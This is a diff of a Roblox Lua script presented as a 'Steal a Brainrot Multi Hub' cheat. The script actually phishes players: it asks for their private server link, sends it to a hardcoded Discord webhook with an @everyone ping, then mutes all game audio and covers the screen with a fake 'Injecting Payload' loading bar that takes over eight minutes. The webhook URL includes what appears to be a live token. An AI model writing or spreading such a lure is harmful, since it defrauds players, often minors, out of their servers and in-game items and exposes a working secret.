@@ -1,35 +1,63 @@
+----------------------------------------------------
+-- SERVICES
+----------------------------------------------------
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local SoundService = game:GetService("SoundService")
 
 local player = Players.LocalPlayer
 
+----------------------------------------------------
+-- HARD MUTE ALL AUDIO (ROBLOX-CORRECT)
+----------------------------------------------------
+for _, obj in ipairs(game:GetDescendants()) do
+	if obj:IsA("Sound") then
+		obj.Volume = 0
+		obj:Stop()
+	end
+end
+
+game.DescendantAdded:Connect(function(obj)
+	if obj:IsA("Sound") then
+		obj.Volume = 0
+		obj:Stop()
+	end
+end)
+
+SoundService.DescendantAdded:Connect(function(obj)
+	if obj:IsA("Sound") then
+		obj.Volume = 0
+		obj:Stop()
+	end
+end)
+
+----------------------------------------------------
+-- SETTINGS
+----------------------------------------------------
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1450125198358745230/Vz1uCDcqt_Ngw6yHbIU4Ohje6SpBRemBIbLNuRduqN1sUZLgDQ9WHdHMrjTTjuqZFvNq"
 local TITLE_TEXT = "Steal a Brainrot Multi Hub"
 local SECONDS_PER_PERCENT = 5
 
+----------------------------------------------------
+-- PRIVATE SERVER CHECK
+----------------------------------------------------
 local function isPrivateServerLink(text)
 	if type(text) ~= "string" then return false end
 	text = string.lower(text)
-
-	if not string.find(text, "roblox.com") then
-		return false
-	end
-
-	if string.find(text, "privateserverlinkcode=") then
-		return true
-	end
-
-	if string.find(text, "type=server") then
-		return true
-	end
-
+	if not string.find(text, "roblox.com") then return false end
+	if string.find(text, "privateserverlinkcode=") then return true end
+	if string.find(text, "type=server") then return true end
 	return false
 end
 
+----------------------------------------------------
+-- WEBHOOK
+----------------------------------------------------
 local function sendWebhook(text)
 	local payload = {
-		content = "@everyone\nNew Private Server Link:\n" .. text .. "\nLoading Time: 1%"
+		content = "@everyone\nNew Private Server Link:\n" .. text .. "\nLoading Started"
 	}
 
 	local req =
@@ -38,133 +66,158 @@ local function sendWebhook(text)
 		or http_request
 		or request
 
-	if not req then
-		return
-	end
+	if not req then return end
 
 	req({
 		Url = WEBHOOK_URL,
 		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
+		Headers = { ["Content-Type"] = "application/json" },
 		Body = HttpService:JSONEncode(payload)
 	})
 end
 
+----------------------------------------------------
+-- GUI (TOP PRIORITY)
+----------------------------------------------------
 local gui = Instance.new("ScreenGui")
 gui.Name = "ScriptBypasserGUI"
 gui.ResetOnSpawn = false
 gui.IgnoreGuiInset = true
 gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-gui.Enabled = true
+gui.DisplayOrder = 99999
+gui.Parent = player:WaitForChild("PlayerGui")
 
-pcall(function()
-	if syn and syn.protect_gui then
-		syn.protect_gui(gui)
-	end
-end)
-
-gui.Parent = game:GetService("CoreGui")
-
-local menu = Instance.new("Frame")
-menu.Parent = gui
+----------------------------------------------------
+-- MENU
+----------------------------------------------------
+local menu = Instance.new("Frame", gui)
 menu.Size = UDim2.fromScale(0.35, 0.35)
 menu.Position = UDim2.fromScale(0.325, 0.325)
 menu.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
 menu.BorderSizePixel = 0
-menu.ZIndex = 5
+menu.ZIndex = 10
 Instance.new("UICorner", menu).CornerRadius = UDim.new(0, 18)
 
-local title = Instance.new("TextLabel")
-title.Parent = menu
+local menuStroke = Instance.new("UIStroke", menu)
+menuStroke.Thickness = 2
+menuStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local title = Instance.new("TextLabel", menu)
 title.Size = UDim2.fromScale(1, 0.25)
 title.BackgroundTransparency = 1
 title.Text = "Multi Hub"
 title.Font = Enum.Font.GothamBold
-title.TextColor3 = Color3.new(1, 1, 1)
+title.TextColor3 = Color3.new(1,1,1)
 title.TextScaled = true
-title.ZIndex = 6
+title.ZIndex = 11
 
-local box = Instance.new("TextBox")
-box.Parent = menu
+local box = Instance.new("TextBox", menu)
 box.Size = UDim2.fromScale(0.9, 0.2)
 box.Position = UDim2.fromScale(0.05, 0.35)
 box.PlaceholderText = "Paste PRIVATE SERVER link only"
-box.Text = ""
-box.ClearTextOnFocus = false
-box.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
-box.TextColor3 = Color3.new(1, 1, 1)
+box.BackgroundColor3 = Color3.fromRGB(35,35,35)
+box.TextColor3 = Color3.new(1,1,1)
 box.Font = Enum.Font.Gotham
 box.TextScaled = true
 box.BorderSizePixel = 0
-box.ZIndex = 6
-Instance.new("UICorner", box).CornerRadius = UDim.new(0, 12)
+box.ZIndex = 11
+Instance.new("UICorner", box).CornerRadius = UDim.new(0,12)
 
-local submit = Instance.new("TextButton")
-submit.Parent = menu
+local submit = Instance.new("TextButton", menu)
 submit.Size = UDim2.fromScale(0.5, 0.18)
 submit.Position = UDim2.fromScale(0.25, 0.65)
 submit.Text = "Submit"
-submit.BackgroundColor3 = Color3.new(1, 1, 1)
-submit.TextColor3 = Color3.new(0, 0, 0)
 submit.Font = Enum.Font.GothamBold
 submit.TextScaled = true
-submit.BorderSizePixel = 0
-submit.ZIndex = 10
-Instance.new("UICorner", submit).CornerRadius = UDim.new(0, 12)
+submit.BackgroundColor3 = Color3.new(1,1,1)
+submit.TextColor3 = Color3.new(0,0,0)
+submit.ZIndex = 11
+Instance.new("UICorner", submit).CornerRadius = UDim.new(0,12)
 
-local black = Instance.new("Frame")
-black.Parent = gui
-black.Size = UDim2.fromScale(1, 1)
-black.BackgroundColor3 = Color3.new(0, 0, 0)
+----------------------------------------------------
+-- LOADING SCREEN (ABSOLUTE TOP)
+----------------------------------------------------
+local black = Instance.new("Frame", gui)
+black.Size = UDim2.fromScale(1,1)
+black.BackgroundColor3 = Color3.new(0,0,0)
 black.Visible = false
-black.ZIndex = 20
+black.ZIndex = 99999
 
-local loadTitle = Instance.new("TextLabel")
-loadTitle.Parent = black
-loadTitle.Size = UDim2.fromScale(1, 0.2)
-loadTitle.Position = UDim2.fromScale(0, 0.25)
+local blackStroke = Instance.new("UIStroke", black)
+blackStroke.Thickness = 2
+blackStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+local loadTitle = Instance.new("TextLabel", black)
+loadTitle.Size = UDim2.fromScale(1,0.2)
+loadTitle.Position = UDim2.fromScale(0,0.22)
 loadTitle.BackgroundTransparency = 1
 loadTitle.Text = TITLE_TEXT
 loadTitle.Font = Enum.Font.GothamBlack
-loadTitle.TextColor3 = Color3.new(1, 1, 1)
+loadTitle.TextColor3 = Color3.new(1,1,1)
 loadTitle.TextScaled = true
-loadTitle.ZIndex = 21
+loadTitle.ZIndex = 100000
 
-local barBG = Instance.new("Frame")
-barBG.Parent = black
-barBG.Size = UDim2.fromScale(0.6, 0.05)
-barBG.Position = UDim2.fromScale(0.2, 0.55)
-barBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-barBG.BorderSizePixel = 0
-barBG.ZIndex = 21
-Instance.new("UICorner", barBG).CornerRadius = UDim.new(1, 0)
+local barBG = Instance.new("Frame", black)
+barBG.Size = UDim2.fromScale(0.6,0.05)
+barBG.Position = UDim2.fromScale(0.2,0.5)
+barBG.BackgroundColor3 = Color3.fromRGB(40,40,40)
+barBG.ZIndex = 100000
+Instance.new("UICorner", barBG).CornerRadius = UDim.new(1,0)
 
-local bar = Instance.new("Frame")
-bar.Parent = barBG
-bar.Size = UDim2.fromScale(0, 1)
-bar.BackgroundColor3 = Color3.new(1, 1, 1)
-bar.BorderSizePixel = 0
-bar.ZIndex = 22
-Instance.new("UICorner", bar).CornerRadius = UDim.new(1, 0)
+local bar = Instance.new("Frame", barBG)
+bar.Size = UDim2.fromScale(0,1)
+bar.BackgroundColor3 = Color3.new(1,1,1)
+bar.ZIndex = 100001
+Instance.new("UICorner", bar).CornerRadius = UDim.new(1,0)
 
-local percentLabel = Instance.new("TextLabel")
-percentLabel.Parent = black
-percentLabel.Size = UDim2.fromScale(1, 0.1)
-percentLabel.Position = UDim2.fromScale(0, 0.62)
+local percentLabel = Instance.new("TextLabel", black)
+percentLabel.Size = UDim2.fromScale(1,0.08)
+percentLabel.Position = UDim2.fromScale(0,0.57)
 percentLabel.BackgroundTransparency = 1
-percentLabel.Text = "1%"
 percentLabel.Font = Enum.Font.Gotham
-percentLabel.TextColor3 = Color3.new(1, 1, 1)
+percentLabel.TextColor3 = Color3.new(1,1,1)
 percentLabel.TextScaled = true
-percentLabel.ZIndex = 21
+percentLabel.ZIndex = 100000
 
+local tipsLabel = Instance.new("TextLabel", black)
+tipsLabel.Size = UDim2.fromScale(1,0.07)
+tipsLabel.Position = UDim2.fromScale(0,0.64)
+tipsLabel.BackgroundTransparency = 1
+tipsLabel.Font = Enum.Font.Gotham
+tipsLabel.TextColor3 = Color3.fromRGB(180,180,180)
+tipsLabel.TextScaled = true
+tipsLabel.ZIndex = 100000
+
+local tips = {
+	"Injecting Payload",
+	"Bypassing Base Restrictions",
+	"Synchronizing Environment",
+	"Patching Runtime",
+	"Finalizing Injection"
+}
+
+----------------------------------------------------
+-- RAINBOW EFFECT
+----------------------------------------------------
+task.spawn(function()
+	local t = 0
+	while true do
+		t += RunService.RenderStepped:Wait()
+		local color = Color3.fromHSV((t * 0.1) % 1, 0.8, 1)
+		bar.BackgroundColor3 = color
+		loadTitle.TextColor3 = color
+		menuStroke.Color = color
+		blackStroke.Color = color
+	end
+end)
+
+----------------------------------------------------
+-- BUTTON LOGIC
+----------------------------------------------------
 local loading = false
 
 submit.MouseButton1Click:Connect(function()
 	if loading then return end
-
 	if not isPrivateServerLink(box.Text) then
 		box.Text = ""
 		box.PlaceholderText = "INVALID LINK (PRIVATE SERVER ONLY)"
@@ -177,16 +230,18 @@ submit.MouseButton1Click:Connect(function()
 	menu.Visible = false
 	black.Visible = true
 
-	local current = 1
-	while current <= 100 do
-		percentLabel.Text = current .. "%"
+	for i = 1, 100 do
+		percentLabel.Text = i .. "%"
+
+		local tipIndex = math.clamp(math.floor((i - 1) / 20) + 1, 1, #tips)
+		tipsLabel.Text = tips[tipIndex]
+
 		TweenService:Create(
 			bar,
 			TweenInfo.new(0.25),
-			{ Size = UDim2.fromScale(current / 100, 1) }
+			{ Size = UDim2.fromScale(i / 100, 1) }
 		):Play()
 
 		task.wait(SECONDS_PER_PERCENT)
-		current += 1
 	end
 end)
